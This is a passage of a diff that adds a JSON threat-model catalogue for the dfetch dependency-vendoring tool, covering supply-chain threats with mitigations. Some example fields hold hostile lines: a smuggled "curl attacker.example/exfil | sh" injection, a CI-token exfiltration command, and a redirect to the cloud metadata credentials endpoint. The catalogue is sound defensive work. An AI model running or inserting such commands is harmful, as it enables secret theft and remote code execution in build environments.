@@ -1,0 +1,497 @@
+[
+  {
+    "SID": "DFT-01",
+    "target": [
+      "Dataflow"
+    ],
+    "description": "Unencrypted transport interception (MITM)",
+    "details": "A network-adjacent attacker intercepts an unencrypted data flow (HTTP, plaintext VCS protocol, or similar) and substitutes or reads content in transit.  Transport-layer attacks are invisible to the application when no channel encryption is enforced.",
+    "Likelihood Of Attack": "Medium",
+    "severity": "High",
+    "condition": "target.controls.isPlaintext is True and target.controls.isNetworkFlow is True",
+    "prerequisites": "A tool or configuration accepts a plaintext-protocol URL (http://, svn://, git://).  The attacker has a network-adjacent position - shared LAN, BGP hijack, or compromised DNS resolver.",
+    "mitigations": "Restrict all configured URLs to encrypted transports (HTTPS, svn+https://, SSH).  Enforce the transport scheme at the configuration-validation layer so plaintext URLs are rejected at parse time.  Apply cryptographic integrity hashes to archive sources so substitution is detected even when transport is later found to have been intercepted.",
+    "example": "A CI runner on a shared cloud network fetches a dependency archive over http://.  A co-located attacker intercepts the TCP stream and replaces the archive bytes before they reach the build tool.",
+    "references": "https://capec.mitre.org/data/definitions/94.html, https://cwe.mitre.org/data/definitions/319.html"
+  },
+  {
+    "SID": "DFT-02",
+    "target": [
+      "Dataflow"
+    ],
+    "description": "Supply-chain content substitution via server-side compromise",
+    "details": "An attacker who compromises an upstream repository host, archive server, or CDN delivers malicious source code because no cryptographic content hash is verified end-to-end.  Transport security (TLS) protects only against network-layer interception; it cannot detect content that has been legitimately served but tampered with on the server before delivery.",
+    "Likelihood Of Attack": "Medium",
+    "severity": "High",
+    "condition": "target.controls.providesIntegrity is False and target.controls.isNetworkFlow is True",
+    "prerequisites": "No integrity hash is declared for archive sources, or the dependency is a VCS reference (branch or tag) for which no hash equivalent is available.  The attacker controls or has compromised an upstream server, registry, or CDN node.",
+    "mitigations": "Require cryptographic integrity hashes for all archive dependencies.  Pin VCS dependencies to immutable commit SHAs rather than mutable branch or tag references.  Verify artifact signatures or SLSA provenance attestations where supported by the upstream.",
+    "example": "A project vendor hosts a tarball on a self-managed server.  An attacker who previously compromised the server replaces it with a backdoored version; the build tool downloads and vendors it without detecting the substitution.",
+    "references": "https://capec.mitre.org/data/definitions/186.html, https://cwe.mitre.org/data/definitions/494.html"
+  },
+  {
+    "SID": "DFT-03",
+    "target": [
+      "Process"
+    ],
+    "description": "Path traversal in archive or patch extraction",
+    "details": "A malicious archive member or patch file uses relative path sequences (e.g. ../../) or absolute paths to write files outside the intended extraction directory, potentially overwriting project sources, CI configuration, or secrets.",
+    "Likelihood Of Attack": "Medium",
+    "severity": "Very High",
+    "condition": "target.controls.sanitizesInput is False",
+    "prerequisites": "The archive or patch file originates from an attacker-controlled or compromised upstream source.  The extraction process does not resolve and validate destination paths against an approved root directory.",
+    "mitigations": "Resolve every member's destination path - following symlinks - and reject any path whose canonical form lies outside the intended extraction root.  Validate all symlinks after extraction.  Reject patches whose headers reference paths outside the project boundary.",
+    "example": "A tarball contains the member ../../.github/workflows/publish.yml; without path-traversal checks this overwrites the CI publish workflow, injecting a secret-exfiltration step.",
+    "references": "https://capec.mitre.org/data/definitions/139.html, https://cwe.mitre.org/data/definitions/22.html, CVE-2001-1267"
+  },
+  {
+    "SID": "DFT-04",
+    "target": [
+      "Datastore"
+    ],
+    "description": "Sensitive datastore write without content integrity verification",
+    "details": "A datastore that accepts write operations from potentially untrusted sources does not validate or verify the content being written.  An attacker with influence over the upstream source can inject malicious content that is consumed by downstream processes without detection.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.storesSensitiveData is True and target.hasWriteAccess is True and target.controls.validatesInput is False",
+    "prerequisites": "The attacker has write access to the upstream source - through a compromised server or local filesystem access.  The consuming process trusts the datastore content without re-validation.",
+    "mitigations": "Validate all content on read using a strict schema.  Apply cryptographic integrity hashes to detect substitution before content is written to sensitive datastores.  Restrict write access to trusted, authenticated sources only.",
+    "example": "Fetched source code is written to a vendor directory from an unverified HTTP source.  Because no integrity hash is present, injected malicious source passes undetected into the consumer's build.",
+    "references": "https://capec.mitre.org/data/definitions/438.html, https://cwe.mitre.org/data/definitions/345.html"
+  },
+  {
+    "SID": "DFT-05",
+    "target": [
+      "Dataflow"
+    ],
+    "description": "Mutable VCS reference enables silent content substitution",
+    "details": "A branch- or tag-pinned VCS dependency is a mutable reference.  An upstream maintainer or attacker with repository write access can silently change the content fetched on the next update - without any configuration diff, hash mismatch, or alerting mechanism being triggered.",
+    "Likelihood Of Attack": "Medium",
+    "severity": "Medium",
+    "condition": "target.controls.isHardened is False and target.controls.providesIntegrity is False and target.controls.isNetworkFlow is True",
+    "prerequisites": "A dependency is pinned to a mutable VCS reference (branch or tag, not a full commit SHA).  The upstream repository permits force-pushes to the tracked reference, or an attacker has compromised a maintainer account.",
+    "mitigations": "Pin all VCS dependencies to a full, immutable commit SHA.  Periodically audit upstream refs against previously recorded SHAs.  Enable signed commits or tag verification where the upstream supports it.",
+    "example": "A dependency is pinned to a release tag v2.1.  A maintainer account is compromised; the attacker force-pushes a backdoored commit to that tag.  The next dependency update silently vendors the malicious code.",
+    "references": "https://slsa.dev/spec/v1.0/threats#b-submit-change, https://capec.mitre.org/data/definitions/690.html, https://cwe.mitre.org/data/definitions/829.html"
+  },
+  {
+    "SID": "DFT-06",
+    "target": [
+      "Process"
+    ],
+    "description": "Command injection via unsanitised subprocess input",
+    "details": "If external commands are invoked via a shell interpreter, or with unsanitised user-controlled strings interpolated into command arguments, an attacker who can influence configuration inputs can inject arbitrary shell commands that execute with the privileges of the calling process.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.controls.invokesSubprocess is True and target.controls.usesParameterizedInput is False",
+    "prerequisites": "A process invokes external commands using a shell interpreter or string interpolation without strict sanitisation of inputs derived from untrusted sources such as configuration files, CLI arguments, or environment variables.",
+    "mitigations": "Invoke all external programs with shell execution disabled and using list-form argument passing.  Validate all configuration string fields with a strict allowlist regular expression before use as subprocess arguments.",
+    "example": "A manifest URL field contains '; curl attacker.example/exfil | sh'.  If the tool passes the URL to a shell command without proper argument isolation, the injected command executes in the build environment.",
+    "references": "https://capec.mitre.org/data/definitions/88.html, https://cwe.mitre.org/data/definitions/78.html"
+  },
+  {
+    "SID": "DFT-07",
+    "target": [
+      "Process"
+    ],
+    "description": "CI/CD secret exfiltration via supply-chain attack on build environment",
+    "details": "A compromised or malicious step in a CI/CD pipeline - injected via a pull request, a poisoned third-party action or plugin, or a backdoored build dependency - reads secrets from the runner environment and exfiltrates them over an outbound network channel.  Without strict egress controls, any code executing in the CI environment can access and transmit secrets.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.controls.isHardened is False",
+    "prerequisites": "A pipeline step can run attacker-controlled code - through a malicious PR modifying pipeline configuration, a compromised third-party action or plugin, or a backdoored build dependency.  Outbound network access from the CI environment is not restricted to an explicit allowlist.",
+    "mitigations": "Pin all third-party CI actions and plugins to a full commit SHA.  Set the CI egress policy to block with an explicit allowlist of required hosts.  Scope secrets narrowly - avoid propagating all secrets to every pipeline job.  Require mandatory reviewer approval before privileged operations such as publish and deploy.",
+    "example": "A PR adds a pipeline step that runs curl -s $CI_TOKEN | attacker.example/collect.  Because egress is only audited (not blocked), the exfiltration succeeds and the attacker obtains a publish credential.",
+    "references": "https://slsa.dev/spec/v1.0/threats#e-build-process, https://capec.mitre.org/data/definitions/560.html, https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"
+  },
+  {
+    "SID": "DFT-08",
+    "target": [
+      "Datastore"
+    ],
+    "description": "Tampered secondary artifact suppresses or bypasses security checks",
+    "details": "An attacker with access to the local build environment or a compromised CI step tampers with a secondary artifact - dependency metadata, patch files, pipeline configuration, or security reports - to suppress security checks or inject malicious behaviour into subsequent pipeline runs.  Primary assets are protected; secondary ones are trusted implicitly.",
+    "Likelihood Of Attack": "Low",
+    "severity": "Medium",
+    "condition": "target.controls.validatesInput is False and target.hasWriteAccess is True and target.storesSensitiveData is False",
+    "prerequisites": "The attacker has write access to the local repository or the CI runner's working directory.  Downstream processes consume the artifact without re-validation or integrity checking.",
+    "mitigations": "Apply integrity verification (checksums or signatures) to secondary build artifacts.  Treat dependency metadata as an append-only audit log where feasible.  Protect pipeline configuration files via branch-protection rules and mandatory code review.",
+    "example": "An attacker modifies a dependency metadata cache file to record a known-good hash for a compromised dependency, causing the up-to-date check to report no changes and suppressing the security alert.",
+    "references": "https://capec.mitre.org/data/definitions/268.html, https://cwe.mitre.org/data/definitions/494.html"
+  },
+  {
+    "SID": "DFT-09",
+    "target": [
+      "Process"
+    ],
+    "description": "Archive decompression bomb causes resource exhaustion",
+    "details": "A specially crafted archive (zip bomb, tar bomb) expands to an extremely large or deeply nested file tree, causing the extracting process to exhaust disk, memory, or CPU resources.  Without pre-extraction size and member-count limits the process may hang or crash, destabilising the build environment.",
+    "Likelihood Of Attack": "Low",
+    "severity": "Medium",
+    "condition": "target.controls.checksInputBounds is False",
+    "prerequisites": "The archive originates from an attacker-controlled or compromised source.  The extraction process applies no upper bound on uncompressed size or total member count before or during extraction.",
+    "mitigations": "Enforce configurable upper limits on uncompressed size and member count, applied early in the streaming extraction loop before writing any bytes to disk.  Reject archives that exceed either threshold.",
+    "example": "A 42 KB zip bomb (42.zip) expands to 4.5 PB of nested zero-byte files; without a member-count limit the extraction loop runs indefinitely, exhausting disk space on the CI runner.",
+    "references": "https://capec.mitre.org/data/definitions/130.html, https://cwe.mitre.org/data/definitions/400.html"
+  },
+  {
+    "SID": "DFT-10",
+    "target": [
+      "Datastore"
+    ],
+    "description": "Build or development dependency substitution via compromised registry",
+    "details": "A project's own build and development dependencies are fetched from a public registry without cryptographic hash verification.  A compromised registry mirror, BGP-hijacked endpoint, or DNS-spoofed response can substitute a malicious package that runs arbitrary code during installation or build, with access to CI/CD secrets.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.controls.providesIntegrity is False and target.hasWriteAccess is False",
+    "prerequisites": "A public package registry or its DNS resolution is compromised.  The CI install step does not use hash-pinned dependency files (e.g. requirements files with integrity hashes, lockfiles with integrity fields).",
+    "mitigations": "Pin all build and development dependencies using cryptographic hashes in a lockfile or requirements file.  Use a private registry mirror with content verification.  Prefer installing from a pinned lockfile over loose version ranges in CI pipelines.",
+    "example": "A BGP hijack redirects package registry traffic to a malicious mirror that serves a backdoored build tool.  The backdoor runs at install time, exfiltrating the CI publish token before the build begins.",
+    "references": "https://capec.mitre.org/data/definitions/538.html, https://cwe.mitre.org/data/definitions/494.html"
+  },
+  {
+    "SID": "DFT-11",
+    "target": [
+      "Process"
+    ],
+    "description": "Privileged account compromise enables unauthorised merge or release",
+    "details": "A maintainer or repository-admin account with merge or release-trigger permissions is compromised through phishing, credential stuffing, session hijacking, or MFA bypass.  The attacker gains the ability to merge pull requests without peer review, push directly to protected branches, or trigger the release workflow - bypassing all branch-protection and review gates.  Once in control of the release pipeline, the attacker can publish a backdoored package without any automated block.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.controls.hasAccessControl is True and target.controls.isHardened is False",
+    "prerequisites": "A maintainer account holds merge or release-trigger rights.  The repository does not require hardware-token MFA for privileged operations, or does not enforce mandatory second-approver sign-off on the release environment.",
+    "mitigations": "Enforce hardware-token MFA (FIDO2/WebAuthn) for all accounts with merge or publish rights.  Require deployment-environment reviewer approval before release pipelines execute.  Monitor for off-hours merges, single-approver releases, and unexpected publish events.  Rotate publish credentials immediately on suspected account compromise.",
+    "example": "An attacker phishes a maintainer's credentials and an SMS-based TOTP code.  They merge a backdoored PR in a low-traffic window, trigger the release workflow, and publish a malicious package before the compromise is detected.",
+    "references": "https://slsa.dev/spec/v1.0/threats#c-source-code-management, https://capec.mitre.org/data/definitions/194.html, https://docs.github.com/en/actions/security-guides/using-environments-for-deployment, https://cwe.mitre.org/data/definitions/306.html"
+  },
+  {
+    "SID": "DFT-12",
+    "target": [
+      "Dataflow"
+    ],
+    "description": "SSRF via unvalidated HTTP redirect chain",
+    "details": "Tools that follow HTTP 3xx redirects when fetching remote resources may accept redirect targets without validating the destination host.  A compromised or malicious server can issue a redirect to an internal network address - such as cloud instance-metadata endpoints, container orchestration APIs, or any RFC-1918 address reachable from the build host - causing the tool to retrieve and store the response locally.  The resulting content may be extracted or logged, leaking internal credentials or configuration.",
+    "Likelihood Of Attack": "Medium",
+    "severity": "High",
+    "condition": "target.controls.isHardened is False and target.controls.followsRedirects is True",
+    "prerequisites": "The tool is configured with an http:// URL, or an https:// URL that redirects through an unencrypted hop.  The build host has network access to internal metadata endpoints or private services.  The attacker controls or has compromised the server or an intermediate CDN node.",
+    "mitigations": "Validate that each redirect destination host is in an explicit allowlist before following it.  Reject redirects that resolve to RFC-1918, loopback, or link-local address ranges.  Enforce HTTPS for all configured URLs so both the original request and all redirects use encrypted transport.",
+    "example": "A manifest pins a dependency to http://files.example.com/lib-2.0.tar.gz.  The server responds with a 301 redirect to http://169.254.169.254/latest/meta-data/iam/security-credentials/role.  The tool follows the redirect, receives the JSON body containing AWS access keys, and writes it to a temporary file - leaving the credential on disk in the build environment.",
+    "references": "https://capec.mitre.org/data/definitions/664.html, https://cwe.mitre.org/data/definitions/918.html"
+  },
+  {
+    "SID": "DFT-13",
+    "target": [
+      "Datastore"
+    ],
+    "description": "Credential embedded in source URL persisted to unencrypted metadata",
+    "details": "Dependency management tools often record the source URL in a metadata or lock file after a successful fetch.  If the URL contains an embedded credential in the userinfo component (user:password@host), that credential is written verbatim to the metadata file in plaintext.  Because metadata files are typically committed to version control, the credential propagates into the project's commit history and becomes readable by every repository clone, CI environment with checkout access, and any attacker who gains access to the repository.",
+    "Likelihood Of Attack": "Medium",
+    "severity": "High",
+    "condition": "target.isCredentials is True and target.isStored is True and target.isDestEncryptedAtRest is False",
+    "prerequisites": "A user embeds a credential in a source URL instead of using an OS keychain, SSH agent, or CI secret store.  The tool's metadata file is committed to version control without sanitising the stored URL.",
+    "mitigations": "Detect the userinfo component in URLs at parse time and warn or reject them.  Strip embedded credentials from URLs before writing them to any persistent metadata file.  Document that credentials must be supplied through external credential helpers, not embedded in source URLs.  Run secret-scanning tooling as a pre-commit hook to catch inadvertent credential commits.",
+    "example": "A developer adds https://ci-bot:<TOKEN>@github.com/corp/private-lib.git to the manifest to access a private dependency from CI.  The tool fetches successfully and writes the full URL - including the token - to its metadata file.  A colleague commits both files; the token now appears in the repository's git history.",
+    "references": "https://capec.mitre.org/data/definitions/37.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/522.html"
+  },
+  {
+    "SID": "DFT-14",
+    "target": [
+      "Process"
+    ],
+    "description": "Dangerous file permission bits preserved during archive extraction",
+    "details": "TAR archives encode Unix file mode bits - including setuid (S_ISUID), setgid (S_ISGID), and sticky (S_ISVTX) - in each member header.  Archive extraction implementations that do not explicitly strip these bits before or after writing extracted files to disk will preserve them.  A malicious archive member with setuid-root mode produces an executable in the extraction directory that runs with elevated privileges when any user invokes it.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.controls.isArchiveExtractor == True and target.controls.isHardened is False",
+    "prerequisites": "The archive extraction implementation does not explicitly strip or validate file mode bits.  The archive originates from an attacker-controlled or compromised source.  The host's umask does not independently strip setuid bits on extraction.",
+    "mitigations": "Explicitly strip setuid and setgid bits from all extracted members - either by clearing the bits before extraction or by applying permission normalisation afterwards.  Use extraction library versions or API options that apply a safe mode filter by default.  Validate that no extracted file has setuid, setgid, or world-writable bits before copying it to the final destination.",
+    "example": "A compromised upstream tarball contains a member with mode 04755 (setuid root, world-executable).  The extraction implementation does not strip the bit.  A later build step invokes the extracted binary, which runs as root and modifies a system file.",
+    "references": "https://capec.mitre.org/data/definitions/17.html, https://cwe.mitre.org/data/definitions/732.html, https://docs.python.org/3/library/tarfile.html#tarfile-extraction-filter"
+  },
+  {
+    "SID": "DFT-15",
+    "target": [
+      "Process"
+    ],
+    "description": "VCS externals / submodules trigger undeclared third-party fetches",
+    "details": "VCS client operations such as SVN export/checkout and Git submodule update can transparently fetch content from additional external URLs embedded in the repository's metadata (svn:externals properties, .gitmodules).  When a tool invokes these operations without suppressing external references, it silently retrieves content from sources not declared in the tool's own configuration.  These extra fetches bypass the tool's manifest-level controls: no integrity hash is checked, no configuration entry exists for the external source, and the fetched content is not subject to the same code-review or audit trail as declared dependencies.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.controls.invokesSubprocess is True and target.controls.providesIntegrity is False and target.controls.isHardened is False",
+    "prerequisites": "The tool fetches an SVN repository or processes Git submodules without suppressing external references.  The upstream repository has externals or submodule entries defined.  The attacker controls an external URL referenced by the upstream repository, or can modify the upstream repository's external configuration.",
+    "mitigations": "Pass flags that suppress external reference processing (e.g. --ignore-externals for SVN) on every checkout or export operation.  Document whether the tool processes external references and advise users to declare them explicitly as separate dependency entries.  Warn or fail if external references are detected in a checked-out tree.",
+    "example": "A project depends on an SVN library.  A maintainer adds an svn:externals entry pointing to an attacker-controlled server.  The next dependency update silently checks out the injected content alongside the declared library with no manifest entry, no integrity check, and no audit trail.",
+    "references": "https://capec.mitre.org/data/definitions/186.html, https://svnbook.red-bean.com/en/1.7/svn.advanced.externals.html"
+  },
+  {
+    "SID": "DFT-16",
+    "target": [
+      "Process"
+    ],
+    "description": "Configured destination path allows writes to security-sensitive project directories",
+    "details": "Destination-path validation for vendored content typically prevents writes outside the project root (path traversal).  However, if no further constraints restrict writes to a designated vendor subdirectory, any within-root path is a valid destination - including security-sensitive files and directories such as CI pipeline definitions, build scripts, package manifests, and test fixtures.  This differs from path traversal (DFT-03): the path stays within the root and passes traversal checks, but deliberately targets files that control code execution in privileged contexts.",
+    "Likelihood Of Attack": "Low",
+    "severity": "Very High",
+    "condition": "target.controls.sanitizesInput is True and target.controls.hasAccessControl is False",
+    "prerequisites": "The attacker has write access to the tool's configuration file - through direct repository access, a compromised maintainer account, or a successful configuration-tampering attack.  The target directory contains files that are executed with elevated privileges such as CI workflow definitions, build scripts, or test runners.",
+    "mitigations": "Maintain an explicit denylist of security-sensitive path prefixes and reject any configured destination that resolves under them.  Alternatively, require all destination paths to fall under a designated vendor root directory and reject paths outside it.  Raise a warning or error during code review when a destination points to a non-standard directory.",
+    "example": "An attacker with temporary repository access adds a dependency entry whose destination is the CI workflows directory, pointing at a fork that contains a backdoored pipeline file.  The next dependency update silently overwrites the legitimate workflow; the next CI run executes the attacker's pipeline and leaks a publish credential.",
+    "references": "https://capec.mitre.org/data/definitions/75.html, https://cwe.mitre.org/data/definitions/552.html"
+  },
+  {
+    "SID": "DFT-17",
+    "target": [
+      "Dataflow"
+    ],
+    "description": "Typosquatting or unverified source identity on an unauthenticated channel",
+    "details": "An attacker registers a confusable name on a public registry, or positions themselves as the responding server on an unauthenticated network channel.  Because the flow carries no access control, no code-signing verification, and no content-integrity check, the consumer cannot confirm that the bytes received originated from the expected publisher.  A name typo, a DNS hijack, or a BGP-level redirect is sufficient to deliver attacker-controlled content without any anomaly on the consumer's side.",
+    "Likelihood Of Attack": "Medium",
+    "severity": "High",
+    "condition": "target.controls.usesCodeSigning is False and target.controls.providesIntegrity is False and target.controls.hasAccessControl is False and target.controls.isNetworkFlow is True",
+    "prerequisites": "The flow carries no access control that would bind the response to a verified publisher identity.  No cryptographic integrity hash or code-signing signature is verified on the received content.  The attacker can register a confusable name, intercept DNS/BGP resolution, or serve content from a co-located network position.",
+    "mitigations": "Verify package publisher identity and provenance attestations before installing from a public registry.  Pin all remote sources to cryptographic content hashes.  Restrict registry resolution to an explicit allowlist of permitted namespaces and publishers.  Subscribe to namespace-monitoring services that alert on new confusable-name registrations.",
+    "example": "An attacker registers a one-character misspelling of dfetch on PyPI.  Developers who mistype the install command receive the attacker's package, which runs a post-install script exfiltrating the build environment's CI secrets.",
+    "references": "https://slsa.dev/spec/v1.0/threats#h-package-selection, https://capec.mitre.org/data/definitions/693.html, https://cwe.mitre.org/data/definitions/494.html"
+  },
+  {
+    "SID": "DFT-18",
+    "target": [
+      "Datastore"
+    ],
+    "description": "Dependency confusion - public registry package shadows private internal package",
+    "details": "An attacker discovers internal package names by reading error messages, source code, or published CI logs.  They publish a package with the same name to a public registry at a higher version number.  Build tools configured to search both a private registry and the public registry resolve the higher-versioned public entry first, silently replacing the internal dependency with attacker-controlled code that executes during installation or build.",
+    "Likelihood Of Attack": "Medium",
+    "severity": "High",
+    "condition": "target.storesSensitiveData is False and target.hasWriteAccess is False and target.controls.providesIntegrity is False",
+    "prerequisites": "The organisation uses internal package names not registered in the public registry.  Build tooling falls back to a public registry when the private registry returns a 404.  The attacker identifies an internal package name and publishes a higher-versioned entry to the public registry before the organisation reserves the namespace.",
+    "mitigations": "Reserve all internal package namespaces in public registries even if the packages will never be published publicly.  Configure the build tool to resolve private packages only from the private registry with no public fallback.  Pin all dependencies to exact versions verified by cryptographic hash.  Audit registry search order and scoping explicitly.",
+    "example": "A CI workflow installs dev dependencies, one of which is an internal test helper not registered on PyPI.  An attacker finds the name in a build log and publishes a malicious package under that name at a higher version.  The next clean-environment CI run installs the attacker's package from PyPI instead of the internal source.",
+    "references": "https://slsa.dev/spec/v1.0/threats#h-package-selection, https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610, https://capec.mitre.org/data/definitions/693.html, https://cwe.mitre.org/data/definitions/829.html"
+  },
+  {
+    "SID": "DFT-19",
+    "target": [
+      "Datastore"
+    ],
+    "description": "Malicious upstream update or intentional maintainer sabotage (protestware)",
+    "details": "A dependency maintainer - acting maliciously, under duress, or after account compromise - publishes a new version that contains deliberate malicious code: a backdoor, data-exfiltration payload, or destructive wiper.  Because the update is served under the maintainer's legitimate identity through the expected channel, transport-level security provides no protection.  Projects that pin to a mutable version reference or that automatically apply updates accept the malicious version without any alert.",
+    "Likelihood Of Attack": "Low",
+    "severity": "Very High",
+    "condition": "target.storesSensitiveData is True and target.hasWriteAccess is True and target.controls.providesIntegrity is False",
+    "prerequisites": "A dependency has an active maintainer with publish rights.  The consuming project pins to a mutable reference (branch, tag, or loose version range) or enables automatic dependency updates.  No cryptographic verification of the specific artifact at a reviewed commit is performed before it is used.",
+    "mitigations": "Pin dependencies to exact, previously-reviewed immutable references (commit SHA or cryptographic hash).  Require explicit human review before upgrading any dependency.  Verify artifact signatures or SLSA provenance attestations where supported.  Monitor upstream release activity for unexpected or unexplained changes.  Apply runtime sandboxing to limit what any single installed package can access.",
+    "example": "An upstream library vendored by tag releases a patch that inserts an encoded payload in a helper function.  Because the dependency is pinned by tag rather than commit SHA and no integrity hash is verified for VCS dependencies, the next update fetch silently delivers the malicious code.",
+    "references": "https://slsa.dev/spec/v1.0/threats#a-producer, https://capec.mitre.org/data/definitions/186.html, https://cwe.mitre.org/data/definitions/494.html, https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-manifest/"
+  },
+  {
+    "SID": "DFT-20",
+    "target": [
+      "Datastore"
+    ],
+    "description": "Abandoned package namespace reclaimed by malicious actor",
+    "details": "A widely-used open-source package becomes unmaintained and its registry entry, repository namespace, or domain name expires.  An attacker registers the abandoned name and begins publishing malicious releases.  Existing consumers who have not pinned to a specific, previously-reviewed version automatically receive the attacker's code on their next install or update.  Unlike a maintainer-compromise attack, there is no trust relationship to violate - the namespace change may go unnoticed for months.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.storesSensitiveData is False and target.hasWriteAccess is False and target.controls.validatesInput is False and target.controls.providesIntegrity is False",
+    "prerequisites": "A dependency is fetched from a public registry without cryptographic integrity verification.  The upstream project has been abandoned - no new releases or issue responses for an extended period.  The attacker successfully registers or reclaims the namespace before the original author or a trusted fork.",
+    "mitigations": "Audit all dependencies for maintenance health (last release date, issue response rate, contributor activity).  Pin to exact versions verified by cryptographic hash.  Consider in-tree vendoring or forking for critical dependencies that show signs of abandonment.  Subscribe to security advisories that track package-takeover events.",
+    "example": "A small utility library vendored across multiple projects is abandoned by its author.  Two years later an attacker registers the same name on PyPI at a much higher version number.  Projects that install with loose version constraints during CI receive the attacker's package instead of the last legitimate release.",
+    "references": "https://capec.mitre.org/data/definitions/693.html, https://cwe.mitre.org/data/definitions/829.html"
+  },
+  {
+    "SID": "DFT-21",
+    "target": [
+      "Dataflow"
+    ],
+    "description": "Unsigned or forged VCS tag accepted as a trusted version pin",
+    "details": "VCS tags are mutable, unsigned labels that any repository contributor with push rights can create, move, or delete.  A build tool that resolves a dependency by tag name without verifying a cryptographic signature cannot distinguish a legitimate tag from one force-moved to a different commit by a compromised account or malicious maintainer.  The attacker updates the commit that the tag points to; the next fetch silently retrieves different content under the same version label.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.controls.usesCodeSigning is False and target.controls.providesIntegrity is False and target.controls.hasAccessControl is True and target.controls.isNetworkFlow is True",
+    "prerequisites": "The dependency is pinned by a tag name rather than a full commit SHA.  The upstream VCS host allows tag force-push without signature verification.  The consuming tool does not verify a cryptographic signature on the resolved tag object before accepting the commit.",
+    "mitigations": "Pin all VCS dependencies to full, immutable commit SHAs rather than tag names.  When the upstream project provides GPG-signed tags or Sigstore tag attestations, verify the signature before accepting the commit.  Periodically audit recorded SHAs against upstream tags to detect silent force-pushes.",
+    "example": "A library is pinned to a release tag in the manifest.  A maintainer account is compromised; the attacker force-pushes a backdoored commit to that tag.  Because the inbound VCS content arrives over an authenticated HTTPS channel with no end-to-end integrity hash, the next dependency update fetches the substituted commit without any warning.",
+    "references": "https://capec.mitre.org/data/definitions/690.html, https://cwe.mitre.org/data/definitions/345.html"
+  },
+  {
+    "SID": "DFT-22",
+    "target": [
+      "Datastore"
+    ],
+    "description": "Vendored content contains submodule or nested external reference triggering undeclared fetch",
+    "details": "A fetched repository may itself contain nested dependency references - Git submodules, package manifest files (package.json, requirements.txt, Cargo.toml, CMakeLists.txt), or source-level include directives.  If the consuming build system or test runner processes these references, it triggers additional fetches from sources not declared or reviewed in the primary manifest.  These secondary fetches bypass all manifest-level controls: no integrity hash, no code review of the source URL, and no audit trail in the vendored file's own dependency record.",
+    "Likelihood Of Attack": "Low",
+    "severity": "Medium",
+    "condition": "target.storesSensitiveData is True and target.hasWriteAccess is True and target.controls.validatesInput is False and target.controls.isHardened is False",
+    "prerequisites": "The fetched repository contains nested dependency declarations.  The consuming build system automatically resolves them without operator review.  The attacker controls or compromises one of the nested dependency sources, or modifies the primary repository's nested declarations.",
+    "mitigations": "Treat all fetched source code as untrusted until the build system that consumes it also enforces dependency integrity.  Audit vendored repositories for the presence of nested package manifests or submodule entries.  Where possible, export only the required source files rather than the full repository tree.  Document and enforce that vendored content is consumed as static source, not as an independently resolved dependency graph.",
+    "example": "A C library vendored via dfetch contains a CMakeLists.txt that uses FetchContent to pull a formatting library from a GitHub URL at build time.  The downstream project's CMake build silently downloads and compiles the external source; if the formatting library's URL is compromised, the build executes the attacker's C code without any integrity check by the vendoring tool.",
+    "references": "https://capec.mitre.org/data/definitions/186.html, https://cwe.mitre.org/data/definitions/829.html"
+  },
+  {
+    "SID": "DFT-23",
+    "target": [
+      "Dataflow"
+    ],
+    "description": "Replay or freeze attack delivers stale content to suppress security updates",
+    "details": "A network-positioned attacker or compromised caching intermediary intercepts a dependency fetch and returns a previously-cached, older response - one that may contain known vulnerabilities already fixed in current versions.  Because the response is served with a valid status code and no cryptographic freshness mechanism is checked, the build tool accepts the stale content as if it were current.  The attack suppresses security updates without triggering any alert and can persist as long as the attacker controls the caching layer.",
+    "Likelihood Of Attack": "Low",
+    "severity": "Medium",
+    "condition": "target.controls.providesIntegrity is False and target.controls.isHardened is False and target.controls.hasAccessControl is False and target.controls.isNetworkFlow is True",
+    "prerequisites": "A caching proxy, BGP-hijacked resolver, or network-adjacent attacker can serve stale responses for the targeted URL.  The build tool does not verify a cryptographic integrity hash or signed timestamp on the returned content.  The attacker knows the version the consumer is expecting and has access to an older, vulnerable copy.",
+    "mitigations": "Pin dependencies to cryptographic integrity hashes so stale content is detected by hash mismatch.  Use HTTPS for all registry and VCS connections to prevent trivial interception of the transport layer.  Avoid relying on shared or third-party caching layers for security-sensitive dependency resolution.  Verify that the resolved version matches the declared pin, not just the content hash.",
+    "example": "A shared corporate proxy caches an archive response for a commonly-fetched library.  An attacker with access to the proxy serves a cached copy of an older, vulnerable version whenever the current version is requested.  Because the manifest uses an http:// URL and no integrity hash is declared, the stale response is accepted silently.",
+    "references": "https://capec.mitre.org/data/definitions/60.html, https://cwe.mitre.org/data/definitions/494.html"
+  },
+  {
+    "SID": "DFT-24",
+    "target": [
+      "Datastore"
+    ],
+    "description": "Local dependency cache or metadata store poisoned to suppress integrity alerts",
+    "details": "Build tools maintain local caches or metadata records to avoid redundant network fetches and to detect when dependencies are out of date.  An attacker with local filesystem write access - through a compromised developer workstation, a build step running attacker code, or a supply-chain-injected pre-install hook - can overwrite cached content or recorded hashes.  The tool then reads the poisoned cache on subsequent runs, silently serving malicious content as if it were the legitimate cached dependency and suppressing any update or integrity alert.",
+    "Likelihood Of Attack": "Low",
+    "severity": "High",
+    "condition": "target.storesSensitiveData is False and target.hasWriteAccess is True and target.controls.providesIntegrity is False and target.controls.isHardened is False and target.controls.validatesInput is False",
+    "prerequisites": "The attacker has write access to the local filesystem paths used for dependency caching or metadata storage.  The build tool reads the cache without re-verifying the content against a remote integrity source.  The cache format is well-understood and the attacker knows which hashes or metadata fields to modify to suppress detection.",
+    "mitigations": "Treat local caches as untrusted secondary sources - re-verify cached content against a pinned integrity hash before use.  Restrict filesystem permissions on cache directories to the running process user.  Sign or MAC-protect metadata records so tampering is detectable.  On CI runners, clear caches entirely rather than restoring potentially-compromised cache artifacts.",
